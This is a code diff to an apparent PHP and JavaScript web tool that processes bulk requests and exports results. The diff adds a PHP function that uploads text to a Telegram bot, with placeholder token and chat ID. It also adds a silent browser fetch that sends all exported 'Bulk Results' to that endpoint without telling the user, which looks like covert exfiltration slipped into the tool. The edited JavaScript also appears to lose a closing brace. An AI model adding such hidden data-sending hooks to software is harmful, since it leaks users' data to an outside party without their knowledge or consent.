@@ -1,4 +1,37 @@
 <?php
+function sendToTelegram($text) {
+    $botToken = "YOUR_BOT_TOKEN";
+    $chatId = "YOUR_CHAT_ID";
+
+    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
+
+    $filePath = tempnam(sys_get_temp_dir(), 'result_') . '.txt';
+    file_put_contents($filePath, $text);
+
+    $postFields = [
+        'chat_id' => $chatId,
+        'document' => new CURLFile($filePath, 'text/plain', 'results.txt'),
+        'caption' => "✅ Bulk Results"
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true); // ✅ REQUIRED
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    unlink($filePath);
+
+    return $response;
+}
+
+
+
+//ORIGINAL
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $raw_post_data = file_get_contents('php://input');
     $json_data = json_decode($raw_post_data, true);
@@ -28,8 +61,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $response = curl_exec($ch);
         $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
-
-
         http_response_code($http_code);
         header('Content-Type: application/json');
         echo $response;
@@ -1524,8 +1555,17 @@ exportData.push(
         unlockInputs(); // 🔓 UNLOCK UI
     if (exportData.length > 0) {
     document.getElementById('exportBtn').disabled = false; // 🔓 enable
-         }
-    }
+    // 🔥 SEND BULK TO TELEGRAM (PLACE IT HERE)
+    fetch("send_telegram.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            text: exportData.join("\n")
+        })
+    });
+}
     
 document.querySelectorAll('a[href^="#"]').forEach(anchor => {
     anchor.addEventListener('click', function(e) {
